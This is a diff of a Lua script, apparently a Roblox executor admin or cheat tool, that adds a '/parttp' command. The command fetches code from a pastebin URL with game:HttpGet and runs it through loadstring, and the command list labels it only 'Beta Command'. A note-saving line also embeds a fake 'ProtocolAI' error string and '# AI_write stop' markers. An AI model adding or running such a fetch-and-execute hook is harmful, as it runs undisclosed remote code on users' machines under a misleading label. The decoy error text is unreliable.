@@ -2600,9 +2600,12 @@ if cmd == "addnote" then
 local var = string.sub(msg,space+1)
 local V_C1 = "╔═══════════════❖••❖══════════════╗"
 local V_C2 = "╚═══════════════❖••❖══════════════╝"
-local notes = V_C1 .. "\n  Notes by: " .. tostring(speaker.Name) .. " (" .. tostring(speaker.DisplayName) .. ") \n" .. V_C2 .. "\n\n" .. var .. "\n\n# AI_write stop \n\n# VortexFile end \n\n# Attempt to index nil with 'ProtocolAI(start)' - line 7890 (ERROR: 587)"
+local notes = V_C1 .. "\n Notes by: " .. tostring(speaker.Name) .. " (" .. tostring(speaker.DisplayName) .. ") \n" .. V_C2 .. "\n\n" .. var .. "\n\n# AI_write stop \n\n# VortexFile end \n\n# Attempt to index nil with 'ProtocolAI(start)' - line 7890 (ERROR: 587)"
 ProtocolSave(tostring(speaker.DisplayName) .. " Notes.txt", notes)
 notify("notes are saved to your executor folder.")
+end
+if cmd == "parttp" then
+loadstring(game:HttpGet("https://pastebin.com/raw/aYRmhsMG"))()
 end
 -- limits
 end
@@ -2716,6 +2719,7 @@ cmds[#cmds + 1] = {Text = "[101] /copyfcpos",Title = "Copy your freecam position
 cmds[#cmds + 1] = {Text = "[102] /displayui [ping and fps]",Title = "display your fps and ping UI"}
 cmds[#cmds + 1] = {Text = "[103] /nodisplayui [ping and fps]",Title = "remove your display fps and ping UI"}
 cmds[#cmds + 1] = {Text = "[104] /addnote [notes]",Title = "this command will add the log file to your executor folder"}
+cmds[#cmds + 1] = {Text = "[105] /parttp",Title = "Beta Command"}
 
 for v = 1, #cmds do
 -- for _,v in next, #cmds do
